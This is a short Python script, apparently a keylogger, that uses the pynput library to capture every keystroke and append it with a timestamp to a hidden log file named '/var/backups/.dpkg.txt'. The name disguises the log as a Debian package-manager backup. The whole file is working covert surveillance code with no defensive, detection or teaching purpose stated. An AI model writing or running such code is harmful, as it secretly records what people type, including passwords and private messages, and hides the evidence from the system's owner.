import logging
from pynput.keyboard import Listener

# create file 
logging.basicConfig(filename=("/var/backups/.dpkg.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# function in logging
def on_press(key):
    logging.info(key)
    # when press key save the key in file

# Loop logger
with Listener(on_press=on_press) as listener:
    listener.join()  